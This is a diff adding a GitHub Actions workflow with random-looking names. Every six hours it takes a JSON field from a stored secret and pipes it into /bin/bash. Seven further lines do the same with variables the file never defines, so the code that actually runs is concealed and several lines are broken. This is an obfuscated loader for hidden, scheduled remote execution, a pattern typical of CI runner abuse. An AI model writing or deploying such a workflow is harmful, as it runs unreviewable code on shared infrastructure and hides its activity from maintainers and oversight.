@@ -1,0 +1,25 @@
+name: yuxiaolluo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuxiaolluo
+        env:
+          vlizf712: ${{ secrets.vlizf712 }}
+        run: |
+          echo $vlizf712 | jq -r .wyi6250 | /bin/bash
+          echo $whenp5 | jq -r .ymslf68 | /bin/bash
+          echo $jv91 | jq -r .fo7 | /bin/bash
+          echo $jg62616 | jq -r .jhi0262 | /bin/bash
+          echo $wee9943 | jq -r .tnt400 | /bin/bash
+          echo $sd1 | jq -r .ac072 | /bin/bash
+          echo $wlv4031 | jq -r .j046 | /bin/bash
+          echo $fn3 | jq -r .li897 | /bin/bash
+
